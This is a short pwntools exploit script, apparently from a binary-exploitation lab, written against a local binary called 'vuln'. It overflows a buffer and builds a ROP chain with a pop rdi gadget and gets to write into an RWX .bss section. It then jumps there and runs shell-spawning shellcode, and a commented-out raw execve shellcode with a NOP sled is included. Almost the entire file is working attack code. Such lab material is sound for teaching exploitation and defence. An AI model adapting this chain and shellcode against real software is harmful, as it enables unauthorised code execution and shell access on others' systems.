#ROP, ret2bss attack, DEP bypass, ASLR bypass (mprotect in .c + inline rop gadget to setup)
#.BSS with RWX permissions
#BSS = Block Starting Symbol, it contains uninitialized global variables

from pwn import * # Import pwntools

p = process("./vuln") # start the vuln binary, it contains mprotect

#useful to take the time to attach manually from gdb (docker)
sys.stdin.read(1) # reads one byte at a time, similar to getchar()

elf = ELF("./vuln")# Extract data from binary
rop = ROP(elf)# Find ROP gadgets

gets = elf.plt['gets']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]
BSS = elf.get_section_by_name(".bss")["sh_addr"]

log.info("gets@plt: " + hex(gets))
log.info("BSS address: " + hex(BSS))
log.info("pop rdi gadget: " + hex(POP_RDI))
log.info("ret gadget: " + hex(RET))

#Overflow buffer until return address
base = "A"*40

# Create rop chain
#gdb.attach(p)
payload = base.encode()
payload += p64(POP_RDI)
payload += p64(BSS)   #where to write
payload += p64(gets)  #call function
payload += p64(RET)
payload += p64(BSS)   #jump to it

#Send our rop-chain payload
p.recvuntil(b'>')

p.sendline(payload)

#send shellcode to write into bss
print(shellcraft.amd64.linux.sh())

p.sendline(asm(shellcraft.amd64.linux.sh(), arch="amd64")) #it works

#rax clear with xor rax,rax, nop sleed for alignment
#shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#p.sendline(shellcode) #not working: syscall with no effect

p.interactive()
